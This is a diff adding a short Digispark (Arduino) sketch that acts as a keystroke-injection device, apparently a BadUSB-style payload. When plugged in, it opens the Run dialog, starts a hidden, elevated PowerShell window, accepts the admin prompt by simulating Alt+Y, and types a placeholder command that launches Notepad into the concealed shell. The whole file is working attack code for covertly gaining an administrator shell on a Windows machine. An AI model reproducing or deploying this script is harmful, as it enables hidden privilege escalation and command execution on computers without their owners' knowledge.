@@ -1,0 +1,23 @@
+//this will open powershell and hide the window, and as long as you don't click elsewhere you can keep typing in to the hidden window.
+
+#include "DigiKeyboard.h"
+
+void setup() {
+  DigiKeyboard.sendKeyStroke(0);
+
+  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("powershell -windowstyle hidden start-process powershell.exe -Verb runAs -argumentlist \'-windowstyle hidden\';exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_Y);
+  DigiKeyboard.delay(500);
+
+  //you can type in to the hidden window:
+  DigiKeyboard.print("start-process notepad.exe");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
+
+void loop() {
+}
